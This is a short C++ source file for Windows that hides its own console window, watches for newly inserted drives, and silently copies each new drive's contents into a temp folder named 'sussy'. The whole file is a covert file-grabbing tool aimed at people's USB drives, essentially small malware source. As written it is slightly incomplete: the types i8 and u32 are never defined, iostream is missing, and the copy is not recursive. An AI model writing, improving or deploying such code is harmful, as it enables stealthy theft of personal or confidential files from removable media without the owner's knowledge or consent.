#include <Windows.h>
#include <bitset>
#include <filesystem>
#include <sstream>

i8 get_new_drive_letter(u32);
void copy_files(i8);

static u32 s_current_drives{0};

int main() {

    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);

    s_current_drives = GetLogicalDrives();

    while (true) {
        Sleep(1000);

        std::cout << "Looking for new drives..." << std::endl;

        u32 new_drives = GetLogicalDrives();
        if (new_drives != s_current_drives) {
            i8 letter = get_new_drive_letter(new_drives);
            if (letter != 0) {
                std::cout << letter << ":\\ was found!" << std::endl;
                copy_files(letter);
            }

            s_current_drives = new_drives;
        }
    }

    return 0;
}

i8 get_new_drive_letter(u32 new_drives) {
    std::bitset<32> old_bits = s_current_drives;
    std::bitset<32> new_bits = new_drives;


    for (int i = 0; i < old_bits.size(); i++) {

        if (old_bits[i] != new_bits[i]) {
            // Check if device was removed and not inserted
            if (new_bits[i] == 0)
                return 0;

            return (i8)('A' + i);
        }
    }
    return 0;
}


void copy_files(i8 letter) {
    namespace fs = std::filesystem;
    auto temp_path = fs::temp_directory_path();
    auto out_path = temp_path / "sussy";

    std::cout << "Copying to " << out_path << std::endl;

    fs::create_directories(out_path);

    std::stringstream ss;
    ss << letter << ":\\";
    auto input_path = fs::path(ss.str());

    fs::copy(input_path, out_path);
    std::cout << "Done!" << std::endl;
}
